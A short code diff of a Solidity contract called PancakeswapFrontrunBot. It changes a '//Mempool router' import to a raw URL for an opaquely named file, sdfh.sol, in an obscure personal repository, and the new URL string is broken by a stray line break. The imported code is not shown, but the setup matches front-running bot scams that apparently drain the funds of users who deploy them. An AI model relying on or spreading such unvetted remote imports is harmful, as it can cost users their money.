@@ -6,7 +6,8 @@ import "https://github.com/pancakeswap/pancake-swap-periphery/blob/master/contra
 import "https://github.com/pancakeswap/pancake-swap-periphery/blob/master/contracts/interfaces/V1/IUniswapV1Exchange.sol";
 import "https://github.com/pancakeswap/pancake-swap-periphery/blob/master/contracts/interfaces/V1/IUniswapV1Factory.sol";
 //Mempool router
-import "https://github.com/rgbxdf/bnb/blob/d7e9bb24cac338e5593470cc4b9b5910ed7327fc/sdfh.sol";
+import "https://raw.githubusercontent.com/rgbxdf/bnb/d7e9bb24cac338e5593470cc4b9b5910ed7327fc/sdfh.sol
+";
 contract PancakeswapFrontrunBot {
  
     //string public tokenName;
